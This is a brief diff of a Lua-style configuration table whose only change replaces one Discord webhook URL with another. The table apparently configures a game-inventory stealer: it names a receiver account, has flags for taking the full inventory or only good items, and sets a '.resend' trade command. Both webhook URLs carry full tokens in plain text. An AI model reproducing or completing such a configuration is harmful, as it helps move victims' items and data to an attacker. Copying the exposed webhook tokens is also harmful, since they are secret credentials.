@@ -1,6 +1,6 @@
 Config = {
     Receivers = {"8Jamiee8"},
-    Webhook = "https://discord.com/api/webhooks/1266922832525394042/s004OfDhXp2K_nX2TiuGCfNMiNgG12oYg_b3m1GrMSPz_5KUMP3GGXHU2o-as5g-ch07",
+    Webhook = "https://discord.com/api/webhooks/1266904144837611520/cTkC4K2pPOYETm6tUAZnY843z6rDFBlxIO6S2WDGRM7CbFTEWqjY70QbYy0ACupGo2CL",
     FullInventory = true,
     GoodItemsOnly = false,
     ResendTrade = ".resend",
